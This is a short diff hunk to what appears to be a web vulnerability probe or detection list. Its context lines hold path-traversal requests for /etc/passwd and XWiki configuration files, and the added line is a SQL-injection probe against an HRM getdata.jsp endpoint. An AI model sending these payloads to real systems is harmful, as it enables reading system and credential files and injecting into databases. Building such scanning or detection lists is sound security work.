@@ -27,3 +27,4 @@
 /cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd
 /xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg
 /bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg&minify=false
+/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id
